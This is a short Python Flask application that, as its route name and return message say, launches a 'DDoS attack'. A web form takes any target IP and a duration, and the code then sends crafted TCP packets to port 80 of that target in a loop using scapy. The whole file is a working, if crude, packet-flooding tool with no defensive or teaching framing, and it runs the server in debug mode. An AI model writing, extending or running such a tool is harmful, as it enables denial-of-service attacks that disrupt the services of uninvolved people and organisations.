from flask import Flask, request, render_template
from scapy.all import IP, TCP, send
import time

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_ddos', methods=['POST'])
def start_ddos():
    target_ip = request.form['target_ip']
    duration = int(request.form['duration'])
    end_time = time.time() + duration

    while time.time() < end_time:
        packet = IP(dst=target_ip) / TCP(dport=80)
        send(packet, verbose=False)

    return f"DDoS attack on {target_ip} for {duration} seconds has completed."

if __name__ == '__main__':
    app.run(debug=True)
